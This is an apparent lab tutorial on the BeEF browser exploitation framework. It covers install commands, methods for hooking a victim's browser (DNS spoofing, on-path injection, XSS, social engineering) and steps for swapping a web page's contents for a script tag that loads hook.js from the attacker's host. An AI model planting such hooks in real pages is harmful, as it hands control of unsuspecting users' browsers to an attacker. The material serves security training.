<h3>BeEF Overview and Basic Hook Method<h3>
<h4>BeEF (Browser Exploitation Framework)</h4>
CLIENT SIDE ATTACKS
<p>
Browser Exploitation Framework allowing us to launch a number of 
attacks on a hooked target. Targets are hooked once they load a hook url.  We can hook
the Target as follows.
<ul>
<li>DNS spoof requests to a page containing the hook.</li>
<li>Inject the hook in browsed pages (need to be On-Path).</li>
<li>Use XSS exploit.</li>
<li>Social engineer the target to open a hook page.</li>
</ul>
<p>Install BeEF</p>
$  sudo  apt-get update <br/>
$  sudo  apt-get install beef-xxs <br/>
$  sudo  apt-get upgrade beef-xxs 

<p>Search apps and double click beef-xxs to start. <br/>
username: beef <br/>
choose a password. <br/>>
Paste the url into the browser <br/>
<b>http://127.0.0.1:3000/ui/panel</b>
</p>

<h4>Open the framework.</h4>
<p>
You will see we have Online and Offline directories for websites we have hooked.
In order to hook a browser to BeEF we have to get the browser to execute a specific JavaScript code.
<br/>
Web UI: 		http://127.0.0.1:3000/ui/panel<br/>
Hook: 		<script src="http://[IP Address]:3000/hook.js"></script><br/>
Example: 	<script src="http://127.0.0.1:3000/hook.js"></script><br/>
MyKali:	 	<script src="http://192.168.1.72:3000/hook.js"></script><br/>
</p>
<h4>Kali Linux VM only…</h4>
<p>
Open File Manager and go to web root, where the files for our web server are stored.  So, the location where we have our index.html.
<br/>/var/www/html .<br/>

Either double click and hope for the best, or right click and open with your fave text editor.
Backup index.html, then delete contents and paste script link with your IP, you can get from ifconfig.
<br/>
<script src="http://192.168.1.72:3000/hook.js"></script>
<br/>
Start the apache web server: <br/>
$ sudo service apache2 start
</p>
<p>
Go to another virtual machine and browse to your IP.<br/>
You will see an entry in the BeEF panel framework.
</p>
